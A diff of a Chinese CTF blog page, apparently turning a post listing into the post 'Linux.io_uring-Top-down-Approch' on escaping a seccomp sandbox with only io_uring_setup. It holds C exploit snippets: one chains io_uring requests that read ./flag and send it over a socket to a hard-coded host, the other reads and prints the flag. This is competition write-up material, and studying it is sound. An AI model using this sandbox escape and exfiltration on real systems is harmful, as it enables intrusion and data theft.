@@ -18,6 +18,8 @@
   <meta name="keywords" content="pwn" />
 
 
+  <meta name="keywords" content="linux, io_uring, shellcode, nlvi" />
+
 
 <link rel="apple-touch-startup-image" media="(device-width: 375px)" href="assets/apple-launch-1125x2436.png">
 <link rel="apple-touch-startup-image" media="(orientation: landscape)" href="assets/apple-touch-startup-image-2048x1496.png">
@@ -78,10 +80,7 @@
 }
 </style>
 
-  <title>
-  V3rdant's Blog
-  
-</title>
+  <title> Linux.io_uring-Top-down-Approch · V3rdant's Blog </title>
 <meta name="generator" content="Hexo 5.4.2"><link rel="alternate" href="/atom.xml" title="V3rdant's Blog" type="application/atom+xml">
 </head>
 <body>
@@ -222,15 +221,11 @@
       <main class="main" id="main">
         <div class="main-wrapper">
           
-  
-
-<section class="posts">
-  
     
   
   <article class="
   post
-  
+   is_post 
   ">
     <header class="post-header">
       <div class="post-time syuanpi fadeInRightShort back-1">
@@ -246,16 +241,16 @@
       </div>
       <h1 class="post-title syuanpi fadeInRightShort back-2">
         
-          <a href="/Linux.io_uring-Top-down-Approch/">Linux.io_uring-Top-down-Approch</a>
+          Linux.io_uring-Top-down-Approch
         
       </h1>
     </header>
     <div class="post-content syuanpi fadeInRightShort back-3">
       
-        
-          <p>最近在N1线下赛遇见一个seccomp沙箱，限制了只能使用 <code>io_uring_setup</code> 一个系统调用，之前不久的ACTF中， 使用<code>mmap</code>、<code>io_uring_setup</code>、<code>io_uring_enter</code> 三个系统调用，完成了orw。 如何仅仅使用 <code>io_uring_setup</code> 完成orw呢？</p>
+        <p>最近在N1线下赛遇见一个seccomp沙箱，限制了只能使用 <code>io_uring_setup</code> 一个系统调用，之前不久的ACTF中， 使用<code>mmap</code>、<code>io_uring_setup</code>、<code>io_uring_enter</code> 三个系统调用，完成了orw。 如何仅仅使用 <code>io_uring_setup</code> 完成orw呢？</p>
 <p>本文将不仅仅局限于CTF，而是从io_uring的实现出发，先从宏观角度透视io_uring的实现框架， 然后以源代码为基础，自顶向下，从liburing，io_uring的用户态接口， 最后到io_uring的内核实现，一步步聚焦 <code>io_uring</code>  具体的实现。</p>
 <p>由于笔者为安全方向，因此笔者将更多关注 io_uring 中用户和内核态的通信这一容易产生安全漏洞的模块，而不会聚焦io_uring的异步调度和任务处理，以上。</p>
+<span id="more"></span>
 <h2 id="overview">overview</h2>
 <p>在开始前，首先介绍一下什么是<a target="_blank" rel="noopener" href="https://man.archlinux.org/man/io_uring.7.en">io_uring</a> 。</p>
 <p>io_uring 是 Linux 5.1 引入的一套新的异步 I/O 接口机制,主要有以下特点:</p>
@@ -635,7 +630,6 @@ IOPOLL 通过 <code>io_uring_enter</code> 通知内核来收割任务</p>
 <figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br></pre></td><td class="code"><pre><span class="line">sqe[<span class="number">0</span>].opcode = IORING_OP_OPENAT;</span><br><span class="line">sqe[<span class="number">0</span>].flags = IOSQE_IO_HARDLINK;</span><br><span class="line">sqe[<span class="number">0</span>].fd = <span class="number">-100</span>;</span><br><span class="line">sqe[<span class="number">0</span>].addr = flag;</span><br><span class="line"></span><br><span class="line">sqe[<span class="number">1</span>].opcode = IORING_OP_OPENAT;</span><br><span class="line">sqe[<span class="number">1</span>].flags = IOSQE_IO_HARDLINK;</span><br><span class="line">sqe[<span class="number">1</span>].fd = <span class="number">-100</span>;</span><br><span class="line">sqe[<span class="number">1</span>].addr = flag;</span><br><span class="line"></span><br><span class="line">sqe[<span class="number">2</span>].opcode = IORING_OP_OPENAT;</span><br><span class="line">sqe[<span class="number">2</span>].flags = IOSQE_IO_HARDLINK;</span><br><span class="line">sqe[<span class="number">2</span>].fd = <span class="number">-100</span>;</span><br><span class="line">sqe[<span class="number">2</span>].addr = flag;</span><br><span class="line"></span><br><span class="line">sqe[<span class="number">3</span>].opcode = IORING_OP_OPENAT;</span><br><span class="line">sqe[<span class="number">3</span>].flags = IOSQE_IO_HARDLINK;</span><br><span class="line">sqe[<span class="number">3</span>].fd = <span class="number">-100</span>;</span><br><span class="line">sqe[<span class="number">3</span>].addr = flag;</span><br><span class="line"></span><br><span class="line">sqe[<span class="number">4</span>].opcode = IORING_OP_OPENAT;</span><br><span class="line">sqe[<span class="number">4</span>].flags = IOSQE_IO_HARDLINK;</span><br><span class="line">sqe[<span class="number">4</span>].fd = <span class="number">-100</span>;</span><br><span class="line">sqe[<span class="number">4</span>].addr = flag;</span><br><span class="line"></span><br><span class="line">sqe[<span class="number">5</span>].opcode = IORING_OP_READ;</span><br><span class="line">sqe[<span class="number">5</span>].flags = IOSQE_IO_HARDLINK;</span><br><span class="line">sqe[<span class="number">5</span>].fd = <span class="number">6</span>;</span><br><span class="line">sqe[<span class="number">5</span>].addr = buff;</span><br><span class="line">sqe[<span class="number">5</span>].len = <span class="number">0x100</span>;</span><br><span class="line"></span><br><span class="line">sqe[<span class="number">6</span>].opcode = IORING_OP_SOCKET;</span><br><span class="line">sqe[<span class="number">6</span>].flags = IOSQE_IO_HARDLINK;</span><br><span class="line">sqe[<span class="number">6</span>].fd = <span class="number">2</span>;</span><br><span class="line">sqe[<span class="number">6</span>].off = <span class="number">1</span>;</span><br><span class="line"></span><br><span class="line">sqe[<span class="number">7</span>].opcode = IORING_OP_CONNECT;</span><br><span class="line">sqe[<span class="number">7</span>].flags = IOSQE_IO_HARDLINK;</span><br><span class="line">sqe[<span class="number">7</span>].fd = <span class="number">9</span>;</span><br><span class="line">sqe[<span class="number">7</span>].flags = <span class="number">4</span>;</span><br><span class="line">sqe[<span class="number">7</span>].addr = &amp;socket_add;</span><br><span class="line">sqe[<span class="number">7</span>].off = <span class="number">0x10</span>;</span><br><span class="line"></span><br><span class="line">sqe[<span class="number">8</span>].opcode = IORING_OP_WRITE;</span><br><span class="line">sqe[<span class="number">8</span>].fd = <span class="number">9</span>;</span><br><span class="line">sqe[<span class="number">8</span>].addr = buff;</span><br><span class="line">sqe[<span class="number">8</span>].len = <span class="number">0x100</span>;</span><br></pre></td></tr></table></figure>
 <figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br></pre></td><td class="code"><pre><span class="line"><span class="type">int</span> <span class="title function_">main</span><span class="params">()</span></span><br><span class="line">&#123;</span><br><span class="line">    <span class="class"><span class="keyword">struct</span> <span class="title">io_uring_params</span> <span class="title">params</span> =</span> &#123;<span class="number">0</span>&#125;;</span><br><span class="line">    <span class="type">char</span> flag[<span class="number">0x10</span>] = <span class="string">&quot;./flag\x00&quot;</span>;</span><br><span class="line">    <span class="type">char</span> buff[<span class="number">0x10</span>] = <span class="string">&quot;AAAAAAAA\n&quot;</span>;</span><br><span class="line">    <span class="type">void</span> *ring_ptr;</span><br><span class="line">    <span class="type">unsigned</span> *ktail;</span><br><span class="line">    <span class="class"><span class="keyword">struct</span></span></span><br><span class="line"><span class="class">    &#123;</span></span><br><span class="line">        __u64 a1;</span><br><span class="line">        __u64 a2;</span><br><span class="line">    &#125; socket_add = <span class="comment">//&#123;0x0100007f5c110002, 0&#125;;</span></span><br><span class="line">        &#123;<span class="number">0x017aa8c05c110002</span>,<span class="number">0</span>&#125;;</span><br><span class="line">    <span class="comment">//mmap(0xC0D3000uLL, 0x3000uLL, 7uLL, 34u, 0xFFFFFFFFuLL, 0LL);</span></span><br><span class="line">    params.sq_off.user_addr = <span class="number">0xC0D3000</span> + <span class="number">0x1000</span>;</span><br><span class="line">    ring_ptr = params.cq_off.user_addr = <span class="number">0xC0D3000</span> + <span class="number">0x2000</span>;</span><br><span class="line">    params.flags = IORING_SETUP_SQPOLL | IORING_SETUP_NO_MMAP | IORING_SETUP_NO_SQARRAY;</span><br><span class="line"></span><br><span class="line">    params.sq_thread_idle = <span class="number">0x2000000</span>;</span><br><span class="line"></span><br><span class="line">    <span class="class"><span class="keyword">struct</span> <span class="title">io_uring_sqe</span> *<span class="title">sqe</span> =</span> (<span class="keyword">struct</span> io_uring_sqe *)(<span class="number">0xC0D3000</span> + <span class="number">0x1000</span>);</span><br><span class="line"></span><br><span class="line">    sqe[<span class="number">0</span>].opcode = IORING_OP_OPENAT;</span><br><span class="line">    sqe[<span class="number">0</span>].flags = IOSQE_IO_LINK;</span><br><span class="line">    sqe[<span class="number">0</span>].fd = <span class="number">-100</span>;</span><br><span class="line">    sqe[<span class="number">0</span>].addr = flag;</span><br><span class="line"></span><br><span class="line">    sqe[<span class="number">1</span>].opcode = IORING_OP_OPENAT;</span><br><span class="line">    sqe[<span class="number">1</span>].flags = IOSQE_IO_LINK;</span><br><span class="line">    sqe[<span class="number">1</span>].fd = <span class="number">-100</span>;</span><br><span class="line">    sqe[<span class="number">1</span>].addr = flag;</span><br><span class="line"></span><br><span class="line">    sqe[<span class="number">2</span>].opcode = IORING_OP_OPENAT;</span><br><span class="line">    <span class="comment">//sqe[2].flags = IOSQE_IO_LINK;</span></span><br><span class="line">    sqe[<span class="number">2</span>].fd = <span class="number">-100</span>;</span><br><span class="line">    sqe[<span class="number">2</span>].addr = flag;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">    sqe[<span class="number">3</span>].opcode = IORING_OP_READ;</span><br><span class="line">    <span class="comment">//sqe[3].flags = IOSQE_IO_LINK;</span></span><br><span class="line">    sqe[<span class="number">3</span>].fd = <span class="number">4</span>;</span><br><span class="line">    sqe[<span class="number">3</span>].addr = buff;</span><br><span class="line">    sqe[<span class="number">3</span>].len = <span class="number">0x100</span>;</span><br><span class="line"></span><br><span class="line">    sqe[<span class="number">4</span>].opcode = IORING_OP_WRITE;</span><br><span class="line">    <span class="comment">//sqe[4].flags = IOSQE_IO_LINK;</span></span><br><span class="line">    sqe[<span class="number">4</span>].fd = <span class="number">1</span>;</span><br><span class="line">    sqe[<span class="number">4</span>].addr = buff;</span><br><span class="line">    sqe[<span class="number">4</span>].len = <span class="number">0x100</span>;</span><br><span class="line"></span><br><span class="line">    </span><br><span class="line">    ktail = ring_ptr + <span class="number">4</span>;</span><br><span class="line">    io_uring_smp_store_release(ktail, <span class="number">5</span>);</span><br><span class="line">    __do_syscall2(<span class="number">425</span>, <span class="number">0x10</span>, &amp;params);</span><br><span class="line"></span><br><span class="line">    <span class="keyword">while</span> (<span class="number">1</span>) &#123;&#125;;</span><br><span class="line">    <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
 
-        
       
     
     </div>
@@ -651,362 +645,79 @@ IOPOLL 通过 <code>io_uring_enter</code> 通知内核来收割任务</p>
       </div>
     
     
-  </article>
-  
-  
-    
-  
+      
 
-  
-    
-  
-  <article class="
-  post
-  
-  ">
-    <header class="post-header">
-      <div class="post-time syuanpi fadeInRightShort back-1">
-        <div class="post-time-wrapper">
-          
-          <time>2023-12-04</time>
-          
-            
-              <span class="post-category"><a href="/categories/CTF/">CTF</a></span>
-            
-          
-        </div>
-      </div>
-      <h1 class="post-title syuanpi fadeInRightShort back-2">
-        
-          <a href="/Linux.io_uring-Top-down-Approach/">Linux.io_uring-Top-down-Approch</a>
-        
-      </h1>
-    </header>
-    <div class="post-content syuanpi fadeInRightShort back-3">
       
-        
-          <p>最近在N1线下赛遇见一个seccomp沙箱，限制了只能使用 <code>io_uring_setup</code> 一个系统调用，之前不久的ACTF中， 使用<code>mmap</code>、<code>io_uring_setup</code>、<code>io_uring_enter</code> 三个系统调用，完成了orw。 如何仅仅使用 <code>io_uring_setup</code> 完成orw呢？</p>
-<p>本文将不仅仅局限于CTF，而是从io_uring的实现出发，先从宏观角度透视io_uring的实现框架， 然后以源代码为基础，自顶向下，从liburing，io_uring的用户态接口， 最后到io_uring的内核实现，一步步聚焦 <code>io_uring</code>  具体的实现。</p>
-<p>由于笔者为安全方向，因此笔者将更多关注 io_uring 中用户和内核态的通信这一容易产生安全漏洞的模块，而不会聚焦io_uring的异步调度和任务处理，以上。</p>
-        
-      
-    
-      <p class="content-link">
-        <a href="/Linux.io_uring-Top-down-Approach/#more">
-          <span>Read More...</span>
-        </a>
-      </p>
-    
+  <hr class="copy-line">
+  <div class="post-copyright">
+    <div class="copy-author">
+      <span>Author :</span>
+      <span>V3rdant</span>
     </div>
-    
-      <div class="post-tags syuanpi fadeInRightShort back-3">
-      
-        <a href="/tags/linux/">linux</a>
-      
-        <a href="/tags/io-uring/">io_uring</a>
-      
-        <a href="/tags/shellcode/">shellcode</a>
-      
-      </div>
-    
-    
-  </article>
-  
-  
-    
-  
-
-  
-    
-  
-  <article class="
-  post
-  
-  ">
-    <header class="post-header">
-      <div class="post-time syuanpi fadeInRightShort back-1">
-        <div class="post-time-wrapper">
-          
-          <time>2023-10-31</time>
-          
-            
-              <span class="post-category"><a href="/categories/CTF/">CTF</a></span>
-            
-          
-        </div>
-      </div>
-      <h1 class="post-title syuanpi fadeInRightShort back-2">
-        
-          <a href="/Linux.Seccomp-and-Ptrace/">Linux.Seccomp-and-Ptrace</a>
-        
-      </h1>
-    </header>
-    <div class="post-content syuanpi fadeInRightShort back-3">
-      
-        
-          <h2 id="Background">Background</h2>
-<p>最近ACTF出现了一个限制非常严格的沙箱，校队里一位pwn师傅搜到了一些用ptrace修改子进程rax来绕过seccomp的wp。</p>
-<p>正值校赛，为了出题的事忙得焦头烂额，就没有细想。</p>
-<p>但是由于我记得seccomp 是内核hook，而ptrace， 出于一些对调试器的映像，我觉得他对于attach的子进程的寄存器的更改，<s>是在用户态实现的</s>。 那么ptrace的处理应该在seccomp之前，所以我觉得不太可行。</p>
-<p>在有时间后，我开始探究了一下，确实不太可行，只是原因跟我想象得不太一样…</p>
-        
-      
-    
-      <p class="content-link">
-        <a href="/Linux.Seccomp-and-Ptrace/#more">
-          <span>Read More...</span>
-        </a>
-      </p>
-    
+    <div class="copy-url">
+      <span>Url :</span>
+      <a href="https://v3rdant.cn/Linux.io_uring-Top-down-Approach/">https://v3rdant.cn/Linux.io_uring-Top-down-Approach/</a>
     </div>
-    
-      <div class="post-tags syuanpi fadeInRightShort back-3">
-      
-        <a href="/tags/Pwn/">Pwn</a>
-      
-        <a href="/tags/linux/">linux</a>
-      
-      </div>
-    
-    
-  </article>
-  
-  
-    
-  
-
-  
-    
-  
-  <article class="
-  post
-  
-  ">
-    <header class="post-header">
-      <div class="post-time syuanpi fadeInRightShort back-1">
-        <div class="post-time-wrapper">
-          
-          <time>2023-06-23</time>
-          
-            
-              <span class="post-category"><a href="/categories/CTF/">CTF</a></span>
-            
-          
-        </div>
-      </div>
-      <h1 class="post-title syuanpi fadeInRightShort back-2">
-        
-          <a href="/Pwn.I-Wanna-be-A-LLVM-Passer/">I wanna be a llvm passer</a>
-        
-      </h1>
-    </header>
-    <div class="post-content syuanpi fadeInRightShort back-3">
-      
-        
-          <h1 id="overview">overview</h1>
-<p>华中赛遇到了一个llvm的题，顺手系统总结一下llvm pass吧。</p>
-<p>首先简单介绍一下llvm，llvm是一套用C++编写的编译器基础设施。LLVM Pass提供了一些可供重写的函数，本义是用来实现一些优化。而Pwn的llvm pass类题，就是重写了runOnFunction函数。</p>
-        
-      
-    
-      <p class="content-link">
-        <a href="/Pwn.I-Wanna-be-A-LLVM-Passer/#more">
-          <span>Read More...</span>
-        </a>
-      </p>
-    
+    <div class="copy-origin">
+      <span>Origin :</span>
+      <a href="https://v3rdant.cn">https://v3rdant.cn</a>
     </div>
-    
-      <div class="post-tags syuanpi fadeInRightShort back-3">
+    <div class="copy-license">
       
-        <a href="/tags/Pwn/">Pwn</a>
-      
-        <a href="/tags/CTF/">CTF</a>
-      
-      </div>
-    
-    
-  </article>
-  
-  
-    
-  
-
-  
-    
-  
-  <article class="
-  post
-  
-  ">
-    <header class="post-header">
-      <div class="post-time syuanpi fadeInRightShort back-1">
-        <div class="post-time-wrapper">
-          
-          <time>2023-06-21</time>
-          
-            
-              <span class="post-category"><a href="/categories/CTF/">CTF</a></span>
-            
-          
-        </div>
-      </div>
-      <h1 class="post-title syuanpi fadeInRightShort back-2">
-        
-          <a href="/Pwn.Heap-Exploation-up-to-2.31/">Pwn.Heap-Exploation-up-to-2.31</a>
-        
-      </h1>
-    </header>
-    <div class="post-content syuanpi fadeInRightShort back-3">
-      
-        
-          <p>关于heap我所知道的一切</p>
-        
-      
-    
-      <p class="content-link">
-        <a href="/Pwn.Heap-Exploation-up-to-2.31/#more">
-          <span>Read More...</span>
-        </a>
-      </p>
-    
+      著作权归作者所有，转载请联系作者获得授权。
     </div>
-    
-      <div class="post-tags syuanpi fadeInRightShort back-3">
-      
-        <a href="/tags/Pwn/">Pwn</a>
-      
-        <a href="/tags/CTF/">CTF</a>
-      
-      </div>
-    
+  </div>
+
     
   </article>
   
-  
     
-  
-
-  
+  <nav class="article-page">
     
-  
-  <article class="
-  post
-  
-  ">
-    <header class="post-header">
-      <div class="post-time syuanpi fadeInRightShort back-1">
-        <div class="post-time-wrapper">
-          
-          <time>2022-08-03</time>
-          
-            
-              <span class="post-category"><a href="/categories/CTF/">CTF</a></span>
-            
-          
-        </div>
-      </div>
-      <h1 class="post-title syuanpi fadeInRightShort back-2">
-        
-          <a href="/Pwn.Stack-Overflow-Overview/">Pwn.StackOverflow-Overview</a>
-        
-      </h1>
-    </header>
-    <div class="post-content syuanpi fadeInRightShort back-3">
-      
-        
-          <h3 id="杂谈">杂谈</h3>
-<p>作为一种基本的漏洞，栈溢出在CTF中出现的非常频繁，因为其多样化的利用形式，难以进行系统的归类，本文结合笔者个人的经验，综合讨论各种栈溢出技术，如果有遗漏，欢迎评论留言，或者给笔者发邮件，进行补充。</p>
-        
-      
-    
-      <p class="content-link">
-        <a href="/Pwn.Stack-Overflow-Overview/#more">
-          <span>Read More...</span>
-        </a>
-      </p>
-    
-    </div>
-    
-      <div class="post-tags syuanpi fadeInRightShort back-3">
-      
-        <a href="/tags/pwn/">pwn</a>
-      
-      </div>
+      <a href="/Linux.io_uring-Top-down-Approch/" id="art-left" class="art-left">
+        <span class="next-title">
+          <i class="iconfont icon-left"></i>Linux.io_uring-Top-down-Approch
+        </span>
+      </a>
     
     
-  </article>
-  
-  
+      <a href="/Linux.Seccomp-and-Ptrace/" id="art-right" class="art-right">
+        <span class="prev-title">
+          Linux.Seccomp-and-Ptrace<i class="iconfont icon-right"></i>
+        </span>
+      </a>
     
-  
-
-  
-    
-  
-  <article class="
-  post
-  
-  ">
-    <header class="post-header">
-      <div class="post-time syuanpi fadeInRightShort back-1">
-        <div class="post-time-wrapper">
-          
-          <time>2022-07-31</time>
-          
-            
-              <span class="post-category"><a href="/categories/CTF/">CTF</a></span>
-            
-          
-        </div>
-      </div>
-      <h1 class="post-title syuanpi fadeInRightShort back-2">
-        
-          <a href="/Pwn.The-Art-of-Shellcode/">Pwn.the-Art-of-Shellcode</a>
-        
-      </h1>
-    </header>
-    <div class="post-content syuanpi fadeInRightShort back-3">
-      
-        
-          <h1 id="Basic">Basic</h1>
-<p>首先给出两个常用shellcode仓库，可以检索需要的shellcode</p>
-<ul>
-<li><a target="_blank" rel="noopener" href="https://shell-storm.org/shellcode/index.html">shellcode database</a></li>
-<li><a target="_blank" rel="noopener" href="https://www.exploit-db.com/google-hacking-database">exploit-db</a></li>
-</ul>
-        
-      
-    
-      <p class="content-link">
-        <a href="/Pwn.The-Art-of-Shellcode/#more">
-          <span>Read More...</span>
-        </a>
-      </p>
-    
-    </div>
-    
-      <div class="post-tags syuanpi fadeInRightShort back-3">
-      
-        <a href="/tags/pwn/">pwn</a>
-      
-      </div>
-    
-    
-  </article>
-  
-  
-    
-  
-
-  
-</section>
-
-  
-  <nav class="pagination">
-      <span class="page-number current">1</span>
   </nav>
 
+
+    
+  <i id="com-switch" class="iconfont icon-down jumping-in long infinite" style="font-size:24px;display:block;text-align:center;transform:rotate(180deg);"></i>
+  <div class="post-comments" id="post-comments" style="display: block;margin: auto 16px;">
+    
+
+    
+    
+
+    
+
+  </div>
+
+
+
+  
+  
+    
+  
+  <aside class="post-toc">
+    <div class="title"><span>Index</span></div>
+    <div class="toc-inner">
+      <ol class="toc"><li class="toc-item toc-level-2"><a class="toc-link" href="#overview"><span class="toc-text">overview</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#io-uring%E4%BB%BB%E5%8A%A1%E6%94%B6%E5%89%B2%E6%A8%A1%E5%BC%8F"><span class="toc-text">io_uring任务收割模式</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#struct"><span class="toc-text">struct</span></a><ol class="toc-child"><li class="toc-item toc-level-4"><a class="toc-link" href="#liburing"><span class="toc-text">liburing</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#kernel"><span class="toc-text">kernel</span></a></li></ol></li></ol></li><li class="toc-item toc-level-2"><a class="toc-link" href="#liburing-2"><span class="toc-text">liburing</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#io-uring-queue-init"><span class="toc-text">io_uring_queue_init</span></a><ol class="toc-child"><li class="toc-item toc-level-4"><a class="toc-link" href="#io-uring-alloc-huge"><span class="toc-text">io_uring_alloc_huge</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#io-uring-queue-mmap"><span class="toc-text">io_uring_queue_mmap</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#io-uring-setup-ring-pointers"><span class="toc-text">io_uring_setup_ring_pointers</span></a></li></ol></li><li class="toc-item toc-level-3"><a class="toc-link" href="#io-uring-get-sqe"><span class="toc-text">io_uring_get_sqe</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#io-uring-prep-xxx"><span class="toc-text">io_uring_prep_xxx</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#io-uring-submit"><span class="toc-text">io_uring_submit</span></a><ol class="toc-child"><li class="toc-item toc-level-4"><a class="toc-link" href="#io-uring-flush-sq"><span class="toc-text">__io_uring_flush_sq</span></a></li></ol></li></ol></li><li class="toc-item toc-level-2"><a class="toc-link" href="#syscall"><span class="toc-text">syscall</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#io-uring-setup"><span class="toc-text">io_uring_setup</span></a><ol class="toc-child"><li class="toc-item toc-level-4"><a class="toc-link" href="#io-allocate-scq-urings"><span class="toc-text">io_allocate_scq_urings</span></a></li></ol></li><li class="toc-item toc-level-3"><a class="toc-link" href="#io-sq-offload-create"><span class="toc-text">io_sq_offload_create</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#io-uring-enter"><span class="toc-text">io_uring_enter</span></a></li></ol></li><li class="toc-item toc-level-2"><a class="toc-link" href="#kernel-2"><span class="toc-text">kernel</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#io-sq-thread-%E5%86%85%E6%A0%B8%E4%BB%BB%E5%8A%A1%E6%8F%90%E4%BA%A4%E6%9C%BA%E5%88%B6"><span class="toc-text">io_sq_thread | 内核任务提交机制</span></a><ol class="toc-child"><li class="toc-item toc-level-4"><a class="toc-link" href="#io-sq-thread"><span class="toc-text">__io_sq_thread</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#io-submit-sqes"><span class="toc-text">io_submit_sqes</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#io-submit-sqe"><span class="toc-text">io_submit_sqe</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#io-queue-sqe-io-issue-sqe-%E9%87%8D%E8%A6%81"><span class="toc-text">io_queue_sqe | io_issue_sqe | 重要</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#io-get-sqe-%E9%87%8D%E8%A6%81"><span class="toc-text">io_get_sqe |  重要</span></a></li></ol></li><li class="toc-item toc-level-3"><a class="toc-link" href="#io-submit-sqe-%E5%90%8C%E6%AD%A5%E4%B8%8E%E5%BC%82%E6%AD%A5%E7%9A%84%E8%AF%B7%E6%B1%82%E6%89%A7%E8%A1%8C"><span class="toc-text">io_submit_sqe | 同步与异步的请求执行</span></a><ol class="toc-child"><li class="toc-item toc-level-4"><a class="toc-link" href="#io-queue-async"><span class="toc-text">io_queue_async</span></a></li></ol></li><li class="toc-item toc-level-3"><a class="toc-link" href="#io-queue-iowq-%E4%BB%BB%E5%8A%A1%E5%A4%84%E7%90%86%E7%BA%BF%E7%A8%8B%E6%B1%A0"><span class="toc-text">io_queue_iowq | 任务处理线程池</span></a><ol class="toc-child"><li class="toc-item toc-level-4"><a class="toc-link" href="#io-wq-enqueue"><span class="toc-text">io_wq_enqueue</span></a></li></ol></li><li class="toc-item toc-level-3"><a class="toc-link" href="#create-io-worker-worker%E5%A4%84%E7%90%86%E7%BA%BF%E7%A8%8B%E7%9A%84%E5%88%9B%E5%BB%BA"><span class="toc-text">create_io_worker  |  worker处理线程的创建</span></a><ol class="toc-child"><li class="toc-item toc-level-4"><a class="toc-link" href="#io-wq-worker-%E5%86%85%E6%A0%B8%E4%BB%BB%E5%8A%A1%E7%BA%BF%E7%A8%8B"><span class="toc-text">io_wq_worker  | 内核任务线程</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#io-worker-handle-work"><span class="toc-text">io_worker_handle_work</span></a></li></ol></li></ol></li><li class="toc-item toc-level-2"><a class="toc-link" href="#summary"><span class="toc-text">summary</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#TODO"><span class="toc-text">TODO</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#exp"><span class="toc-text">exp</span></a></li></ol>
+    </div>
+  </aside>
+
+
+
+  
 
 
         </div>
@@ -1266,6 +977,20 @@ IOPOLL 通过 <code>io_uring_enter</code> 通知内核来收割任务</p>
 <script src="/script/bootstarp.js"></script>
 
 
+
+<script>
+if (nlviconfig.theme.toc) {
+  setTimeout(function() {
+    if (nlviconfig.theme.scheme === 'balance') {
+      $("#header").addClass("show_toc");
+    } else if (nlviconfig.theme.scheme === 'banderole') {
+      $(".container-inner").addClass("has_toc");
+      $(".post-toc .title").addClass("show");
+      $(".toc-inner").addClass("show");
+    }
+  }, 1000);
+}
+</script>
 
 
 
